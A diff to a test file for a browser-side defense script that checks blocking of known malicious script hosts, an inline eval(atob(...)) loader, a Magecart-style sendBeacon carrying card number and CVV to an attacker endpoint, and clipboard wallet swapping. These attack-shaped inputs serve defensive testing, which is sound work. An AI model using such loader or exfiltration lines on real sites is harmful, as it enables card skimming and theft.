@@ -34,6 +34,22 @@ function createGeDefenseSandbox() {
         this.parentNode.childNodes = this.parentNode.childNodes.filter(c => c !== this);
       }
     }
+    getAttribute(name) {
+      const existing = this.attributes.find(a => a.name.toLowerCase() === name.toLowerCase());
+      return existing ? existing.value : null;
+    }
+    appendChild(child) {
+      child.parentNode = this;
+      this.childNodes = this.childNodes || [];
+      this.childNodes.push(child);
+      return child;
+    }
+    insertBefore(newNode, refNode) {
+      newNode.parentNode = this;
+      this.childNodes = this.childNodes || [];
+      this.childNodes.push(newNode);
+      return newNode;
+    }
   }
 
   function parseMockNodes(html, parent) {
@@ -116,6 +132,8 @@ function createGeDefenseSandbox() {
   }
 
   const fakeDocument = {
+    head: new FakeElement('head'),
+    documentElement: new FakeElement('html'),
     createElement(tag) {
       if (tag.toLowerCase() === 'template') return new FakeTemplate();
       return new FakeElement(tag);
@@ -130,13 +148,32 @@ function createGeDefenseSandbox() {
         }
       };
     },
+    querySelector: () => null,
     addEventListener: () => {},
     dispatchEvent: () => {}
   };
 
+  let lastBeaconSent = null;
+  let lastClipboardText = null;
+  let currentSelectionText = '';
+
   const fakeWindow = {
     location: { hostname: 'example.com', href: 'https://example.com/', search: '' },
-    navigator: { userAgent: 'Mozilla/5.0' },
+    navigator: {
+      userAgent: 'Mozilla/5.0',
+      sendBeacon(url, data) {
+        lastBeaconSent = { url, data };
+        return true;
+      },
+      clipboard: {
+        async writeText(t) {
+          lastClipboardText = t;
+        }
+      }
+    },
+    getSelection() {
+      return { toString: () => currentSelectionText };
+    },
     sessionStorage: {
       getItem: () => null,
       setItem: () => {},
@@ -153,6 +190,7 @@ function createGeDefenseSandbox() {
     console: fakeConsole,
     Element: FakeElement,
     Node: FakeNode,
+    URL,
     Math,
     Object,
     String,
@@ -164,7 +202,16 @@ function createGeDefenseSandbox() {
   const engineSource = fs.readFileSync(path.join(__dirname, '../shared/aegis-engine.js'), 'utf-8');
   vm.runInContext(engineSource, context);
 
-  return { context, logs, FakeElement };
+  return {
+    context,
+    logs,
+    FakeElement,
+    fakeDocument,
+    fakeWindow,
+    getLastBeaconSent: () => lastBeaconSent,
+    getLastClipboardText: () => lastClipboardText,
+    setSelectionText: (t) => { currentSelectionText = t; }
+  };
 }
 
 test('GeDefense Light: Self-XSS console defense displays warning', () => {
@@ -216,3 +263,54 @@ test('GeDefense Light: Can be disabled via config toggle', () => {
   context.window.__AEGIS_OMEGA__.setConfig({ GEDEFENSE_LIGHT: false });
   assert.equal(context.window.__AEGIS_OMEGA__.getConfig().GEDEFENSE_LIGHT, false);
 });
+
+test('GeDefense Light: Blocks Optimizely supply-chain loader & iOS exploit kit dynamic <script>/<iframe> injections', () => {
+  const { context, fakeDocument } = createGeDefenseSandbox();
+  const aegis = context.window.__AEGIS_OMEGA__;
+
+  // 1. Direct URL classification check
+  assert.equal(aegis.isMaliciousResourceUrl('https://1688360.cc/track.js', 'script'), true, 'Must block 1688360.cc skimmer loader');
+  assert.equal(aegis.isMaliciousResourceUrl('https://webshell.lol/get.js', 'script'), true, 'Must block webshell.lol loader');
+  assert.equal(aegis.isMaliciousResourceUrl('https://5vobauua3ojpklx.icu/B9/index.html', 'iframe'), true, 'Must block Coruna/DarkSword .icu iOS exploit kit');
+  assert.equal(aegis.isMaliciousResourceUrl('https://example.com/static/app.js', 'script'), false, 'Same-origin script must be allowed');
+  assert.equal(aegis.isMaliciousResourceUrl('https://js.stripe.com/v3/', 'script'), false, 'Legitimate payment provider script must be allowed');
+
+  // 2. setAttribute interception on <script> and <iframe>
+  const scriptEl = fakeDocument.createElement('script');
+  scriptEl.setAttribute('src', 'https://1688360.cc/track.js');
+  assert.match(scriptEl.getAttribute('src'), /^about:blank#vgt-blocked-supply-chain/, 'Malicious script src via setAttribute must be neutralized');
+
+  // 3. appendChild interception for inline Optimizely eval fallback loader
+  const inlineScript = fakeDocument.createElement('script');
+  inlineScript.textContent = 'window._k7 = true; eval(atob("aHR0cHM6Ly8xNjg4MzYwLmNjL3RyYWNrLmpz"));';
+  fakeDocument.head.appendChild(inlineScript);
+  assert.equal(inlineScript.textContent, '/* blocked by GeDefense Light */', 'Inline Optimizely C2 payload must be neutralized before DOM insertion');
+});
+
+test('GeDefense Light: Anti-Magecart sendBeacon Guard blocks card exfiltration to C2 endpoints', () => {
+  const { fakeWindow, getLastBeaconSent } = createGeDefenseSandbox();
+
+  // Attempt Magecart card exfiltration via sendBeacon to 1688360.cc/card.php
+  const res = fakeWindow.navigator.sendBeacon('https://1688360.cc/card.php', JSON.stringify({ cc: '4111222233334444', cvv: '123' }));
+  assert.equal(res, true, 'Defended sendBeacon returns true while dropping malicious exfiltration');
+  assert.equal(getLastBeaconSent(), null, 'Underlying sendBeacon must NOT transmit card data to C2');
+
+  // Legitimate same-origin beacon is permitted
+  fakeWindow.navigator.sendBeacon('https://example.com/api/keepalive', 'ok');
+  assert.ok(getLastBeaconSent(), 'Same-origin non-tracker beacon must be permitted');
+  assert.equal(getLastBeaconSent().url, 'https://example.com/api/keepalive');
+});
+
+test('GeDefense Light: Crypto-Clipper Guard prevents silent wallet address replacement in clipboard', async () => {
+  const { fakeWindow, getLastClipboardText, setSelectionText } = createGeDefenseSandbox();
+
+  const userSelectedWallet = '0x71C7656EC7ab88b098defB751B7401B5f6d8976F';
+  const attackerWallet = '0xDeadBeefDeadBeefDeadBeefDeadBeefDeadBeef';
+
+  // User selects their legitimate ETH address on the page, but clipper script tries to write attacker wallet
+  setSelectionText(userSelectedWallet);
+  await fakeWindow.navigator.clipboard.writeText(attackerWallet);
+
+  assert.equal(getLastClipboardText(), userSelectedWallet, 'Clipboard must retain the user-selected wallet address instead of attacker clipper address');
+});
+
